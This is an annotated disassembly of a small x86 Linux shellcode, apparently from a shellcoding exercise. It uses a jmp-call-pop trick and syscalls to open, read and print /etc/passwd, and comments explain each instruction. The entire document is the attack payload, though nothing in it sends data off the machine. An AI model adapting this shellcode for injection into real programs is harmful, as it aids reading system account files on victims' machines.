00000000  EB36              jmp short 0x38
00000002  B805000000        mov eax,0x5		; open
00000007  5B                pop ebx		; contains the address of /etc/passwd
00000008  31C9              xor ecx,ecx		; flags are set to O_RDONLY
0000000A  CD80              int 0x80


0000000C  89C3              mov ebx,eax		; ebx hold the file descriptor
0000000E  B803000000        mov eax,0x3		; read
00000013  89E7              mov edi,esp		; 
00000015  89F9              mov ecx,edi		; set the buffer for the read
00000017  BA00100000        mov edx,0x1000	; set the count, 4096 bytes 
0000001C  CD80              int 0x80


0000001E  89C2              mov edx,eax		; saves the to edx the number of bytes that were read
00000020  B804000000        mov eax,0x4		; write
00000025  BB01000000        mov ebx,0x1		; set fd to 1, stdout
0000002A  CD80              int 0x80


0000002C  B801000000        mov eax,0x1		; exit
00000031  BB00000000        mov ebx,0x0
00000036  CD80              int 0x80


00000038  E8C5FFFFFF        call 0x2		; return to open section
0000003D  2F                das			;
0000003E  657463            gs jz 0xa4		;
00000041  2F                das			; /etc/passwd
00000042  7061              jo 0xa5		;
00000044  7373              jnc 0xb9		;
00000046  7764              ja 0xac		;
00000048  00                db 0x00		; null character...
